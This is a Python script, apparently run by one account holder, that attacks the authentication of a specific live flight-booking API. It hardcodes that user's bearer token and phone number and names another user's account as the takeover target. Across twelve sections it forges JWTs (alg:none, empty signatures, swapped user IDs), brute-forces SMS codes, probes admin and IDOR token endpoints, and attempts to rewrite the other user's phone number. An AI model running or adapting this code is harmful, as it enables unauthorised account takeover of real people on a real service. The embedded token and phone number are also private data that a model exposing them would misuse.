#!/usr/bin/env python3
"""
COMPREHENSIVE AUTHENTICATION BYPASS & ACCOUNT TAKEOVER TESTING SUITE
=====================================================================

Tests ALL possible authentication vulnerabilities:
1. JWT Token Manipulation (signature bypass, alg:none, user ID modification)
2. SMS Verification Bypass (common codes, test codes, skip flags)
3. Phone Number Enumeration
4. Token Refresh Without Auth
5. Session Hijacking
6. Password Reset Exploitation
7. Token Expiry Bypass
8. Admin Token Generation
9. IDOR in Authentication
10. Token Leakage
11. Rate Limiting on Auth
12. Account Takeover via Profile Update

Author: Security Testing
Date: 2025-11-05
"""

import requests
import json
import base64
import hmac
import hashlib
import time
from datetime import datetime, timedelta
from typing import Dict, List, Any

# ============================================================================
# CONFIGURATION
# ============================================================================

API_URL = "https://vauntapi.flyvaunt.com"

# Sameer's credentials
SAMEER_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
SAMEER_USER_ID = 20254
SAMEER_PHONE = "+13035234453"

# Ashley's user ID (target for account takeover tests)
ASHLEY_USER_ID = 26927

# Test results storage
results = {
    "timestamp": str(datetime.now()),
    "tests": [],
    "vulnerabilities": [],
    "critical_findings": []
}

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def log_test(category: str, test_name: str, result: Dict[str, Any]):
    """Log test results"""
    test_entry = {
        "category": category,
        "test": test_name,
        "timestamp": str(datetime.now()),
        **result
    }
    results["tests"].append(test_entry)
    return test_entry

def add_vulnerability(severity: str, title: str, description: str, cvss: float = None):
    """Add a vulnerability finding"""
    vuln = {
        "severity": severity,
        "title": title,
        "description": description,
        "cvss": cvss,
        "timestamp": str(datetime.now())
    }
    results["vulnerabilities"].append(vuln)
    if severity in ["CRITICAL", "HIGH"]:
        results["critical_findings"].append(vuln)
    return vuln

def decode_jwt(token: str) -> Dict[str, Any]:
    """Decode JWT without verification"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return {"error": "Invalid JWT format"}

        # Decode header
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))

        # Decode payload
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

        return {
            "header": header,
            "payload": payload,
            "signature": parts[2]
        }
    except Exception as e:
        return {"error": str(e)}

def create_modified_jwt(payload: Dict, signature: str = None, algorithm: str = "HS256") -> str:
    """Create a modified JWT token"""
    try:
        # Create header
        header = {"alg": algorithm, "typ": "JWT"}

        # Encode header and payload
        header_encoded = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).decode().rstrip('=')

        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')

        # Use provided signature or empty
        if signature is None:
            signature = ""

        return f"{header_encoded}.{payload_encoded}.{signature}"
    except Exception as e:
        return None

def api_request(method: str, endpoint: str, token: str = None, data: Dict = None, headers: Dict = None) -> Dict:
    """Make API request and return result"""
    url = f"{API_URL}{endpoint}"

    req_headers = {
        "Content-Type": "application/json"
    }

    if token:
        req_headers["Authorization"] = f"Bearer {token}"

    if headers:
        req_headers.update(headers)

    try:
        start_time = time.time()

        if method == "GET":
            response = requests.get(url, headers=req_headers, timeout=10)
        elif method == "POST":
            response = requests.post(url, headers=req_headers, json=data, timeout=10)
        elif method == "PATCH":
            response = requests.patch(url, headers=req_headers, json=data, timeout=10)
        elif method == "PUT":
            response = requests.put(url, headers=req_headers, json=data, timeout=10)
        elif method == "DELETE":
            response = requests.delete(url, headers=req_headers, json=data, timeout=10)
        else:
            return {"error": f"Unsupported method: {method}"}

        elapsed = time.time() - start_time

        result = {
            "status": response.status_code,
            "elapsed": elapsed,
            "headers": dict(response.headers),
        }

        # Try to parse JSON response
        try:
            result["data"] = response.json()
        except:
            result["data"] = response.text[:500] if response.text else None

        return result

    except Exception as e:
        return {
            "error": str(e),
            "status": "ERROR"
        }

# ============================================================================
# TEST 1: JWT TOKEN ANALYSIS & MANIPULATION
# ============================================================================

def test_jwt_manipulation():
    """Test JWT token manipulation attacks"""
    print("\n" + "="*80)
    print("TEST 1: JWT TOKEN MANIPULATION")
    print("="*80)

    # 1.1: Decode and analyze current JWT
    print("\n1.1 Analyzing Sameer's JWT Token")
    decoded = decode_jwt(SAMEER_JWT)

    if "error" not in decoded:
        print(f"  Header: {json.dumps(decoded['header'], indent=4)}")
        print(f"  Payload: {json.dumps(decoded['payload'], indent=4)}")
        print(f"  Algorithm: {decoded['header'].get('alg')}")
        print(f"  User ID: {decoded['payload'].get('user')}")
        print(f"  Issued At: {decoded['payload'].get('iat')}")
        print(f"  Expires: {decoded['payload'].get('exp')}")

        log_test("JWT", "decode_jwt", {
            "success": True,
            "decoded": decoded
        })

    # 1.2: Test with modified user ID (Sameer -> Ashley)
    print("\n1.2 Testing JWT with Modified User ID (20254 -> 26927)")
    original_payload = decoded['payload'].copy()
    modified_payload = original_payload.copy()
    modified_payload['user'] = ASHLEY_USER_ID

    # Try with original signature (should fail)
    modified_token = create_modified_jwt(modified_payload, decoded['signature'])
    if modified_token:
        print(f"  Modified Token: {modified_token[:50]}...")
        result = api_request("GET", "/v1/user", token=modified_token)
        print(f"  Status: {result['status']}")

        if result['status'] == 200 and result.get('data'):
            user_id = result['data'].get('id') if isinstance(result['data'], dict) else None
            if user_id == ASHLEY_USER_ID:
                print(f"  🚨 CRITICAL: JWT signature not validated! Accessed user {user_id}")
                add_vulnerability(
                    "CRITICAL",
                    "JWT Signature Not Validated",
                    f"Modified JWT with user ID {ASHLEY_USER_ID} accepted despite invalid signature",
                    cvss=10.0
                )
            else:
                print(f"  ✅ JWT signature validated (user ID: {user_id})")
        else:
            print(f"  ✅ Modified JWT rejected")

        log_test("JWT", "modified_user_id", {
            "modified_payload": modified_payload,
            "result": result
        })

    # 1.3: Test with alg:none attack
    print("\n1.3 Testing JWT with alg:none Attack")
    none_token = create_modified_jwt(original_payload, "", "none")
    if none_token:
        print(f"  None Token: {none_token[:50]}...")
        result = api_request("GET", "/v1/user", token=none_token)
        print(f"  Status: {result['status']}")

        if result['status'] == 200:
            print(f"  🚨 CRITICAL: alg:none attack successful!")
            add_vulnerability(
                "CRITICAL",
                "JWT alg:none Bypass",
                "JWT tokens with alg:none are accepted, allowing signature bypass",
                cvss=10.0
            )
        else:
            print(f"  ✅ alg:none attack blocked")

        log_test("JWT", "alg_none_attack", {"result": result})

    # 1.4: Test with empty signature
    print("\n1.4 Testing JWT with Empty Signature")
    empty_sig_token = create_modified_jwt(original_payload, "")
    if empty_sig_token:
        result = api_request("GET", "/v1/user", token=empty_sig_token)
        print(f"  Status: {result['status']}")

        if result['status'] == 200:
            print(f"  🚨 CRITICAL: Empty signature accepted!")
            add_vulnerability(
                "CRITICAL",
                "JWT Empty Signature Bypass",
                "JWT tokens with empty signature are accepted",
                cvss=10.0
            )
        else:
            print(f"  ✅ Empty signature rejected")

        log_test("JWT", "empty_signature", {"result": result})

    # 1.5: Test with modified expiry date
    print("\n1.5 Testing JWT with Extended Expiry Date")
    extended_payload = original_payload.copy()
    # Extend expiry by 10 years
    extended_payload['exp'] = int(time.time()) + (365 * 24 * 60 * 60 * 10)

    extended_token = create_modified_jwt(extended_payload, decoded['signature'])
    if extended_token:
        result = api_request("GET", "/v1/user", token=extended_token)
        print(f"  Status: {result['status']}")

        if result['status'] == 200:
            print(f"  🚨 CRITICAL: Extended expiry accepted!")
            add_vulnerability(
                "CRITICAL",
                "JWT Expiry Manipulation",
                "JWT tokens with modified expiry dates are accepted",
                cvss=9.5
            )
        else:
            print(f"  ✅ Modified expiry rejected")

        log_test("JWT", "extended_expiry", {"result": result})

    # 1.6: Test with Ashley's user ID and no signature
    print("\n1.6 Testing Complete Token Forgery (Ashley's ID, no signature)")
    forged_payload = {
        "user": ASHLEY_USER_ID,
        "iat": int(time.time()),
        "exp": int(time.time()) + (30 * 24 * 60 * 60)
    }

    forged_token = create_modified_jwt(forged_payload, "")
    if forged_token:
        result = api_request("GET", "/v1/user", token=forged_token)
        print(f"  Status: {result['status']}")

        if result['status'] == 200 and result.get('data'):
            user_id = result['data'].get('id') if isinstance(result['data'], dict) else None
            if user_id == ASHLEY_USER_ID:
                print(f"  🚨🚨🚨 CRITICAL: COMPLETE TOKEN FORGERY SUCCESSFUL!")
                print(f"  🚨 Gained unauthorized access to user {user_id}")
                add_vulnerability(
                    "CRITICAL",
                    "Complete JWT Token Forgery",
                    f"Forged JWT token granting access to user {ASHLEY_USER_ID} accepted",
                    cvss=10.0
                )
        else:
            print(f"  ✅ Forged token rejected")

        log_test("JWT", "complete_forgery", {"result": result})

# ============================================================================
# TEST 2: SMS VERIFICATION BYPASS
# ============================================================================

def test_sms_bypass():
    """Test SMS verification bypass attacks"""
    print("\n" + "="*80)
    print("TEST 2: SMS VERIFICATION BYPASS")
    print("="*80)

    # 2.1: Test common bypass codes
    print("\n2.1 Testing Common SMS Bypass Codes")
    common_codes = ["000000", "123456", "111111", "999999", "000001", "123123"]

    # First, initiate sign-in
    print(f"  Initiating sign-in for {SAMEER_PHONE}...")
    init_result = api_request("POST", "/v1/auth/initiateSignIn", data={
        "phoneNumber": SAMEER_PHONE
    })
    print(f"  Status: {init_result['status']}")

    if init_result['status'] == 200:
        print("\n  Testing common bypass codes:")
        for code in common_codes:
            result = api_request("POST", "/v1/auth/completeSignIn", data={
                "phoneNumber": SAMEER_PHONE,
                "challengeCode": code
            })
            print(f"    Code {code}: Status {result['status']}")

            if result['status'] == 200 and result.get('data'):
                print(f"    🚨 CRITICAL: Code {code} accepted!")
                add_vulnerability(
                    "CRITICAL",
                    f"SMS Bypass with Common Code: {code}",
                    f"Common test code {code} accepted for authentication",
                    cvss=9.8
                )
                log_test("SMS", f"bypass_code_{code}", {"success": True, "result": result})
                break

            time.sleep(0.2)

    # 2.2: Test v2 endpoints with bypass
    print("\n2.2 Testing v2/auth/verify Bypass")
    bypass_attempts = [
        {"code": "BYPASS"},
        {"code": "TEST"},
        {"code": "DEBUG"},
        {"skipVerification": True},
        {"skipVerification": True, "code": "000000"},
        {"bypass": True}
    ]

    for attempt in bypass_attempts:
        result = api_request("POST", "/v2/auth/verify", data=attempt)
        print(f"  {attempt}: Status {result['status']}")

        if result['status'] == 200:
            print(f"  🚨 CRITICAL: V2 bypass successful with {attempt}!")
            add_vulnerability(
                "CRITICAL",
                "V2 SMS Verification Bypass",
                f"V2 auth endpoint accepts bypass: {attempt}",
                cvss=10.0
            )

        log_test("SMS", "v2_bypass", {"attempt": attempt, "result": result})
        time.sleep(0.2)

    # 2.3: Test skipVerification flag on v1
    print("\n2.3 Testing skipVerification Flag on v1")
    result = api_request("POST", "/v1/auth/completeSignIn", data={
        "phoneNumber": SAMEER_PHONE,
        "challengeCode": "000000",
        "skipVerification": True
    })
    print(f"  Status: {result['status']}")

    if result['status'] == 200:
        print(f"  🚨 CRITICAL: skipVerification flag accepted!")
        add_vulnerability(
            "CRITICAL",
            "SMS Verification Skip Flag",
            "skipVerification flag bypasses SMS verification",
            cvss=10.0
        )

    log_test("SMS", "skip_verification_flag", {"result": result})

# ============================================================================
# TEST 3: PHONE NUMBER ENUMERATION
# ============================================================================

def test_phone_enumeration():
    """Test phone number enumeration"""
    print("\n" + "="*80)
    print("TEST 3: PHONE NUMBER ENUMERATION")
    print("="*80)

    print("\n3.1 Testing Response Differences for Valid vs Invalid Numbers")

    # Test valid number
    valid_result = api_request("POST", "/v1/auth/initiateSignIn", data={
        "phoneNumber": SAMEER_PHONE
    })

    # Test invalid numbers
    invalid_numbers = ["+19999999999", "+11111111111", "+12222222222"]

    print(f"\n  Valid Number ({SAMEER_PHONE}):")
    print(f"    Status: {valid_result['status']}")
    print(f"    Time: {valid_result.get('elapsed', 0):.3f}s")
    print(f"    Response: {str(valid_result.get('data'))[:100]}")

    for invalid in invalid_numbers[:2]:
        invalid_result = api_request("POST", "/v1/auth/initiateSignIn", data={
            "phoneNumber": invalid
        })

        print(f"\n  Invalid Number ({invalid}):")
        print(f"    Status: {invalid_result['status']}")
        print(f"    Time: {invalid_result.get('elapsed', 0):.3f}s")
        print(f"    Response: {str(invalid_result.get('data'))[:100]}")

        # Check for enumeration vectors
        time_diff = abs(valid_result.get('elapsed', 0) - invalid_result.get('elapsed', 0))
        response_diff = str(valid_result.get('data')) != str(invalid_result.get('data'))
        status_diff = valid_result['status'] != invalid_result['status']

        if time_diff > 0.5:
            print(f"    ⚠️ TIMING DIFFERENCE: {time_diff:.3f}s")
            add_vulnerability(
                "MEDIUM",
                "Phone Number Enumeration via Timing",
                f"Timing difference of {time_diff:.3f}s allows user enumeration",
                cvss=5.0
            )

        if response_diff or status_diff:
            print(f"    ⚠️ RESPONSE DIFFERENCE detected")
            add_vulnerability(
                "MEDIUM",
                "Phone Number Enumeration via Response",
                "Response differences allow user enumeration",
                cvss=5.0
            )

        log_test("Enumeration", "phone_number", {
            "valid": valid_result,
            "invalid": invalid_result,
            "time_diff": time_diff,
            "response_diff": response_diff
        })

        time.sleep(0.3)

# ============================================================================
# TEST 4: TOKEN REFRESH WITHOUT AUTH
# ============================================================================

def test_token_refresh():
    """Test token refresh without authentication"""
    print("\n" + "="*80)
    print("TEST 4: TOKEN REFRESH WITHOUT AUTH")
    print("="*80)

    refresh_attempts = [
        ("POST", "/v1/auth/refresh", {}),
        ("POST", "/v1/auth/renew", {"userId": SAMEER_USER_ID}),
        ("POST", "/v1/auth/renew", {"userId": ASHLEY_USER_ID}),
        ("GET", f"/v1/auth/token?userId={SAMEER_USER_ID}", None),
        ("GET", f"/v1/auth/token?userId={ASHLEY_USER_ID}", None),
        ("POST", "/v1/auth/token", {"userId": ASHLEY_USER_ID}),
        ("POST", "/v2/auth/refresh", {"userId": ASHLEY_USER_ID}),
    ]

    for method, endpoint, data in refresh_attempts:
        print(f"\n  Testing: {method} {endpoint}")
        result = api_request(method, endpoint, data=data)
        print(f"  Status: {result['status']}")

        if result['status'] == 200 and result.get('data'):
            print(f"  🚨 CRITICAL: Token refresh without auth successful!")
            print(f"  Response: {str(result['data'])[:200]}")

            # Check if we got a JWT token
            if isinstance(result['data'], dict):
                if 'token' in result['data'] or 'jwt' in result['data']:
                    print(f"  🚨🚨🚨 JWT TOKEN LEAKED!")
                    add_vulnerability(
                        "CRITICAL",
                        "Unauthenticated Token Generation",
                        f"{method} {endpoint} generates tokens without authentication",
                        cvss=10.0
                    )

        log_test("Token", "refresh_without_auth", {
            "method": method,
            "endpoint": endpoint,
            "result": result
        })

        time.sleep(0.2)

# ============================================================================
# TEST 5: SESSION HIJACKING
# ============================================================================

def test_session_hijacking():
    """Test session hijacking vulnerabilities"""
    print("\n" + "="*80)
    print("TEST 5: SESSION HIJACKING")
    print("="*80)

    # 5.1: Get session info
    print("\n5.1 Retrieving Session Information")
    session_endpoints = [
        "/v1/auth/session",
        "/v1/user/session",
        "/v1/session",
        "/v2/auth/session",
        "/v1/auth/sessions",
    ]

    for endpoint in session_endpoints:
        result = api_request("GET", endpoint, token=SAMEER_JWT)
        print(f"  {endpoint}: Status {result['status']}")

        if result['status'] == 200 and result.get('data'):
            print(f"    Session data found: {str(result['data'])[:200]}")

            # Check for sensitive session info
            if isinstance(result['data'], dict):
                if 'sessionId' in result['data'] or 'sessionToken' in result['data']:
                    print(f"    ⚠️ Session tokens exposed")
                    add_vulnerability(
                        "HIGH",
                        "Session Token Exposure",
                        f"{endpoint} exposes session tokens",
                        cvss=7.5
                    )

        log_test("Session", "info_retrieval", {
            "endpoint": endpoint,
            "result": result
        })

        time.sleep(0.2)

    # 5.2: Test if we can use session without device binding
    print("\n5.2 Testing Session Device Binding")
    # Try with different User-Agent
    headers = {"User-Agent": "DifferentDevice/1.0"}
    result = api_request("GET", "/v1/user", token=SAMEER_JWT, headers=headers)
    print(f"  Different User-Agent: Status {result['status']}")

    if result['status'] == 200:
        print(f"  ⚠️ No device binding - session works on different device")
        add_vulnerability(
            "MEDIUM",
            "No Device Binding",
            "Sessions are not device-bound, enabling session hijacking",
            cvss=6.0
        )

# ============================================================================
# TEST 6: PASSWORD RESET EXPLOITATION
# ============================================================================

def test_password_reset():
    """Test password reset exploitation"""
    print("\n" + "="*80)
    print("TEST 6: PASSWORD RESET EXPLOITATION")
    print("="*80)

    reset_attempts = [
        ("POST", "/v1/auth/reset-password", {"phoneNumber": SAMEER_PHONE}),
        ("POST", "/v1/auth/forgot-password", {"phoneNumber": SAMEER_PHONE}),
        ("POST", "/v1/auth/reset", {"phoneNumber": SAMEER_PHONE}),
        ("POST", "/v2/auth/reset", {"phoneNumber": SAMEER_PHONE}),
        ("POST", "/v1/auth/reset", {"token": "guessed_token"}),
    ]

    for method, endpoint, data in reset_attempts:
        print(f"\n  Testing: {method} {endpoint}")
        result = api_request(method, endpoint, data=data)
        print(f"  Status: {result['status']}")

        if result['status'] == 200:
            print(f"  ⚠️ Password reset endpoint exists")
            if result.get('data'):
                print(f"  Response: {str(result['data'])[:200]}")

        log_test("Password", "reset_exploitation", {
            "method": method,
            "endpoint": endpoint,
            "result": result
        })

        time.sleep(0.2)

# ============================================================================
# TEST 7: TOKEN EXPIRY BYPASS
# ============================================================================

def test_token_expiry():
    """Test token expiry bypass"""
    print("\n" + "="*80)
    print("TEST 7: TOKEN EXPIRY BYPASS")
    print("="*80)

    decoded = decode_jwt(SAMEER_JWT)

    if "error" not in decoded:
        exp = decoded['payload'].get('exp')
        iat = decoded['payload'].get('iat')

        print(f"\n  Current Token Expiry: {datetime.fromtimestamp(exp)}")
        print(f"  Time until expiry: {(exp - time.time()) / 86400:.1f} days")

        # Check if token is already expired
        if exp < time.time():
            print(f"  Token is EXPIRED!")

            # Test if expired token still works
            result = api_request("GET", "/v1/user", token=SAMEER_JWT)
            print(f"  Testing with expired token: Status {result['status']}")

            if result['status'] == 200:
                print(f"  🚨 CRITICAL: Expired token still accepted!")
                add_vulnerability(
                    "CRITICAL",
                    "Token Expiry Not Enforced",
                    "Expired JWT tokens are still accepted",
                    cvss=9.0
                )
        else:
            print(f"  Token is still valid")

# ============================================================================
# TEST 8: ADMIN TOKEN GENERATION
# ============================================================================

def test_admin_token():
    """Test admin token generation"""
    print("\n" + "="*80)
    print("TEST 8: ADMIN TOKEN GENERATION")
    print("="*80)

    admin_attempts = [
        ("POST", "/v1/auth/admin/token", {}),
        ("POST", "/v1/auth/token", {"role": "admin"}),
        ("POST", "/v1/auth/token", {"admin": True}),
        ("POST", "/v1/auth/generate", {"userId": SAMEER_USER_ID, "admin": True}),
        ("POST", "/v1/admin/auth/token", {"userId": SAMEER_USER_ID}),
        ("GET", "/v1/auth/admin/generate", None),
    ]

    for method, endpoint, data in admin_attempts:
        print(f"\n  Testing: {method} {endpoint}")
        result = api_request(method, endpoint, token=SAMEER_JWT, data=data)
        print(f"  Status: {result['status']}")

        if result['status'] == 200 and result.get('data'):
            print(f"  🚨 CRITICAL: Admin endpoint accessible!")
            print(f"  Response: {str(result['data'])[:200]}")

            if isinstance(result['data'], dict) and ('token' in result['data'] or 'jwt' in result['data']):
                print(f"  🚨🚨🚨 ADMIN TOKEN GENERATED!")
                add_vulnerability(
                    "CRITICAL",
                    "Unauthorized Admin Token Generation",
                    f"{method} {endpoint} allows admin token generation",
                    cvss=10.0
                )

        log_test("Admin", "token_generation", {
            "method": method,
            "endpoint": endpoint,
            "result": result
        })

        time.sleep(0.2)

# ============================================================================
# TEST 9: IDOR IN AUTHENTICATION
# ============================================================================

def test_idor_auth():
    """Test IDOR in authentication endpoints"""
    print("\n" + "="*80)
    print("TEST 9: IDOR IN AUTHENTICATION")
    print("="*80)

    idor_attempts = [
        ("POST", "/v1/auth/token", {"userId": ASHLEY_USER_ID}),
        ("GET", f"/v1/user/{ASHLEY_USER_ID}/token", None),
        ("POST", "/v1/auth/generate", {"userId": ASHLEY_USER_ID}),
        ("POST", "/v2/auth/token", {"userId": ASHLEY_USER_ID}),
        ("GET", f"/v1/auth/user/{ASHLEY_USER_ID}", None),
    ]

    print(f"\n  Attempting to generate token for user {ASHLEY_USER_ID} (Ashley)")

    for method, endpoint, data in idor_attempts:
        print(f"\n  Testing: {method} {endpoint}")
        result = api_request(method, endpoint, token=SAMEER_JWT, data=data)
        print(f"  Status: {result['status']}")

        if result['status'] == 200 and result.get('data'):
            print(f"  🚨 CRITICAL: IDOR in authentication!")
            print(f"  Response: {str(result['data'])[:200]}")

            # Check if we got a token for Ashley
            if isinstance(result['data'], dict):
                if 'token' in result['data'] or 'jwt' in result['data']:
                    token = result['data'].get('token') or result['data'].get('jwt')
                    decoded = decode_jwt(token)
                    if 'payload' in decoded and decoded['payload'].get('user') == ASHLEY_USER_ID:
                        print(f"  🚨🚨🚨 OBTAINED TOKEN FOR USER {ASHLEY_USER_ID}!")
                        add_vulnerability(
                            "CRITICAL",
                            "IDOR in Token Generation",
                            f"Generated authentication token for user {ASHLEY_USER_ID} using IDOR",
                            cvss=10.0
                        )

        log_test("IDOR", "auth_endpoints", {
            "method": method,
            "endpoint": endpoint,
            "target_user": ASHLEY_USER_ID,
            "result": result
        })

        time.sleep(0.2)

# ============================================================================
# TEST 10: TOKEN LEAKAGE
# ============================================================================

def test_token_leakage():
    """Test for token leakage in various endpoints"""
    print("\n" + "="*80)
    print("TEST 10: TOKEN LEAKAGE")
    print("="*80)

    leakage_endpoints = [
        "/v1/logs",
        "/v1/debug/tokens",
        "/v1/admin/sessions",
        "/v1/auth/debug",
        "/v1/debug",
        "/v1/admin/users",
        "/v1/admin/auth",
        "/health",
        "/status",
        "/v1/system/info",
    ]

    print("\n  Checking endpoints for token leakage...")

    for endpoint in leakage_endpoints:
        result = api_request("GET", endpoint, token=SAMEER_JWT)
        print(f"  {endpoint}: Status {result['status']}")

        if result['status'] == 200 and result.get('data'):
            data_str = str(result['data']).lower()

            # Check for JWT patterns
            if 'eyj' in data_str or 'bearer' in data_str:
                print(f"    🚨 POTENTIAL TOKEN LEAKAGE!")
                print(f"    Response: {str(result['data'])[:300]}")
                add_vulnerability(
                    "HIGH",
                    "Token Leakage",
                    f"{endpoint} leaks authentication tokens",
                    cvss=8.0
                )

            # Check for session IDs
            if 'sessionid' in data_str or 'session_id' in data_str:
                print(f"    ⚠️ Session IDs exposed")

        log_test("Leakage", "token_exposure", {
            "endpoint": endpoint,
            "result": result
        })

        time.sleep(0.2)

# ============================================================================
# TEST 11: RATE LIMITING ON AUTH
# ============================================================================

def test_rate_limiting():
    """Test rate limiting on authentication endpoints"""
    print("\n" + "="*80)
    print("TEST 11: RATE LIMITING ON AUTH")
    print("="*80)

    # 11.1: Test SMS code brute force rate limiting
    print("\n11.1 Testing SMS Code Verification Rate Limiting")
    print("  Initiating sign-in...")
    init = api_request("POST", "/v1/auth/initiateSignIn", data={
        "phoneNumber": SAMEER_PHONE
    })

    if init['status'] == 200:
        print("  Attempting rapid code verification (50 attempts)...")
        rate_limited = False

        for i in range(50):
            code = f"{i:06d}"
            result = api_request("POST", "/v1/auth/completeSignIn", data={
                "phoneNumber": SAMEER_PHONE,
                "challengeCode": code
            })

            if result['status'] == 429:
                print(f"    ✅ Rate limiting detected at attempt {i+1}")
                rate_limited = True
                break
            elif result['status'] == 200:
                print(f"    🚨 CODE ACCEPTED: {code}")
                break

            if i % 10 == 9:
                print(f"    Attempt {i+1}: Status {result['status']}")

        if not rate_limited:
            print(f"    🚨 CRITICAL: No rate limiting - 50 attempts succeeded!")
            add_vulnerability(
                "CRITICAL",
                "No Rate Limiting on SMS Verification",
                "SMS verification codes can be brute forced (no rate limiting)",
                cvss=9.5
            )

    # 11.2: Test token generation rate limiting
    print("\n11.2 Testing Token Generation Rate Limiting")
    print("  Attempting rapid token requests...")

    for i in range(20):
        result = api_request("POST", "/v1/auth/initiateSignIn", data={
            "phoneNumber": SAMEER_PHONE
        })

        if result['status'] == 429:
            print(f"    ✅ Rate limiting detected at attempt {i+1}")
            break

        if i % 5 == 4:
            print(f"    Attempt {i+1}: Status {result['status']}")

        time.sleep(0.05)

# ============================================================================
# TEST 12: ACCOUNT TAKEOVER VIA PROFILE UPDATE
# ============================================================================

def test_account_takeover():
    """Test account takeover via profile update"""
    print("\n" + "="*80)
    print("TEST 12: ACCOUNT TAKEOVER VIA PROFILE UPDATE")
    print("="*80)

    # 12.1: Try to change phone number to attacker's
    print("\n12.1 Testing Phone Number Change")
    attacker_phone = "+19999999999"

    result = api_request("PATCH", "/v1/user", token=SAMEER_JWT, data={
        "phoneNumber": attacker_phone
    })
    print(f"  Status: {result['status']}")

    if result['status'] == 200:
        print(f"  ⚠️ Phone number change allowed")

        # Verify the change
        verify = api_request("GET", "/v1/user", token=SAMEER_JWT)
        if verify['status'] == 200 and verify.get('data'):
            new_phone = verify['data'].get('phoneNumber')
            if new_phone == attacker_phone:
                print(f"  🚨 CRITICAL: Phone number changed to {attacker_phone}")
                print(f"  🚨 Account takeover possible via phone change!")
                add_vulnerability(
                    "CRITICAL",
                    "Account Takeover via Phone Change",
                    "Users can change phone number without verification, enabling account takeover",
                    cvss=9.8
                )

            # Revert the change
            api_request("PATCH", "/v1/user", token=SAMEER_JWT, data={
                "phoneNumber": SAMEER_PHONE
            })

    # 12.2: Try to change email
    print("\n12.2 Testing Email Change")
    attacker_email = "attacker@example.com"

    result = api_request("PATCH", "/v1/user", token=SAMEER_JWT, data={
        "email": attacker_email
    })
    print(f"  Status: {result['status']}")

    if result['status'] == 200:
        print(f"  ⚠️ Email change allowed without verification")

    # 12.3: Try to access other user's profile and modify
    print("\n12.3 Testing Cross-User Profile Modification")
    result = api_request("PATCH", f"/v1/user/{ASHLEY_USER_ID}", token=SAMEER_JWT, data={
        "phoneNumber": attacker_phone
    })
    print(f"  Status: {result['status']}")

    if result['status'] == 200:
        print(f"  🚨🚨🚨 CRITICAL: Modified another user's profile!")
        add_vulnerability(
            "CRITICAL",
            "Cross-User Profile Modification",
            f"Modified user {ASHLEY_USER_ID}'s profile from user {SAMEER_USER_ID}",
            cvss=10.0
        )

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main execution"""
    print("="*80)
    print("COMPREHENSIVE AUTHENTICATION BYPASS & ACCOUNT TAKEOVER TESTING")
    print("="*80)
    print(f"Start Time: {datetime.now()}")
    print(f"API URL: {API_URL}")
    print(f"Tester: User {SAMEER_USER_ID} ({SAMEER_PHONE})")
    print(f"Target: User {ASHLEY_USER_ID} (Account Takeover Test)")
    print("="*80)

    try:
        # Run all tests
        test_jwt_manipulation()
        test_sms_bypass()
        test_phone_enumeration()
        test_token_refresh()
        test_session_hijacking()
        test_password_reset()
        test_token_expiry()
        test_admin_token()
        test_idor_auth()
        test_token_leakage()
        test_rate_limiting()
        test_account_takeover()

    except KeyboardInterrupt:
        print("\n\n⚠️ Testing interrupted by user")
    except Exception as e:
        print(f"\n\n❌ Error during testing: {str(e)}")
        import traceback
        traceback.print_exc()

    # Print summary
    print("\n" + "="*80)
    print("TESTING COMPLETE - GENERATING SUMMARY")
    print("="*80)

    print(f"\n📊 Total Tests Performed: {len(results['tests'])}")
    print(f"🚨 Total Vulnerabilities Found: {len(results['vulnerabilities'])}")
    print(f"🔴 Critical Findings: {len(results['critical_findings'])}")

    if results['critical_findings']:
        print("\n🚨 CRITICAL VULNERABILITIES:")
        for i, vuln in enumerate(results['critical_findings'], 1):
            print(f"\n  {i}. {vuln['title']}")
            print(f"     Severity: {vuln['severity']}")
            if vuln.get('cvss'):
                print(f"     CVSS Score: {vuln['cvss']}/10.0")
            print(f"     Description: {vuln['description']}")

    # Save results
    output_file = '/home/user/vaunt/api_testing/authentication_bypass_results.json'
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)

    print(f"\n✅ Full results saved to: {output_file}")
    print(f"\nEnd Time: {datetime.now()}")
    print("="*80)

    return results

if __name__ == "__main__":
    main()
